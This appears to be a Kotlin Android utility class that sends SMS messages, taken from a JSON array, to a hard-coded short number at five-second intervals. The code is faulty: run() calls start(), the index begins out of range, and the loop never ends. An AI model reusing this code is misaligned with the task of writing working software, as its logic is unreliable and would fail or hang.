package com.hack3r.amshel.mutall.utilities

import android.telephony.SmsManager
import org.json.JSONArray
import org.json.JSONException

class SendSms(val array: JSONArray):Thread(), Runnable {
    override fun run() {
        start()
    }

    fun sendMessages(){
        val manager = SmsManager.getDefault()

        var msgLen = array.length()

        while (msgLen >= 0){
            try {
                var json = array.getJSONObject(msgLen)
                var parts = manager.divideMessage(json.getString("sms"))

                var phone = "95551"
                manager.sendMultipartTextMessage(phone, null, parts, null, null)
                sleep(5000)
            }catch (e:JSONException){
                e.printStackTrace()
            }catch (e:InterruptedException){
                e.printStackTrace()
            }
        }

        msgLen ++
    }
}